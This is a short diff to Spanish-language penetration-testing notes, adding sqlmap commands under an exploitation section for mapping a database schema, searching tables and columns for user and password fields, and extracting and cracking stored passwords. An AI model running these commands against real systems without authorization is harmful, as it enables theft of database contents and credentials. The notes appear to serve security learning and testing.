@@ -410,6 +410,17 @@ EXPLOTACION
                         sqlmap -r consulta.rez -p id -D-D <base de datos> -T <Tabla> -C <Columna,Columna2...> --dump
                   5 - Podemos crackear los hashes con john siguiendo los pasos de sqlmap
 
+                  Otros escaneos SQLmap
+                     - Ver toda la estructura de la BD
+                        sqlmap -r consulta.req --schema
+                     - Buscar palabra clave en Tablas
+                        sqlmap -r consulta.req --search -T user
+                     - Buscar palabra claven e Columnas
+                        sqlmap -r consulta.req --search -C pass
+                     - Descifrar passwords
+                        sqlmap -r consulta.rez --passwords --batch
+
+               
             XSS/CROSS SITE SCRIPTING => Vulnerabilidad que acepta la entrada de codigo javascript
             ........................
 
